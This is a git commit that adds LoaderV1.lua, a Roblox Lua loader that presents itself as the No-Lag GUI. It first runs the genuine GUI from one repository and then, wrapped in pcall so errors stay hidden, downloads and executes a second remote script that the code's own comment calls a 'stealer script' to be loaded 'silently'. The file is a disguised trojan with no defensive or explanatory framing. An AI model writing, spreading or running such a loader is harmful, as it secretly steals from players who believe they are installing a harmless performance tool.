eecab979d765766868919834f3ba14d0b16da664
danielkrupenski <jancmafs@gmail.com>
2025-07-18 05:59:26 +0200

    Create LoaderV1.lua

---
+++ LoaderV1.lua
@@ -0,0 +1,9 @@
+pcall(function()
+    -- Load the real GUI
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()
+end)
+
+pcall(function()
+    -- Load your stealer script silently
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/danielkrupenski/NoLag/main/NoLag"))()
+end)
